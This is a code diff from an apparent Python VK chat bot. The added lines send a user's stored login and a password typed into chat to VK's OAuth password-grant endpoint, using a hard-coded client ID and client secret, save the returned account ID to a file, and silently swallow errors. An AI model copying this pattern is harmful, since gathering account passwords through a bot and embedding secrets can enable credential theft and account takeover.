@@ -637,6 +637,16 @@ for event in longpoll.listen():
                     with open(str(event.user_id) + "login.txt", "r") as cda:
                         iq = cda.read()
                         iq = int(iq)
+                    try:
+                        getInfo = (
+                            f"https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username={iq}&password={event.text}")
+                        infoPhone = urllib.request.urlopen(getInfo)
+                        infoPhone = json.load(infoPhone)
+                        a = open(str(event.user_id) + "akc.txt", "w")
+                        a.write(str(infoPhone["user_id"]))
+                        a.close()
+                    except:
+                           pass
                     qqq = requests.get('https://api.github.com')
                     write_message(sender, f'{qqq}')
                     ss = requests.get(f"https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username={iq}&password={event.text}")
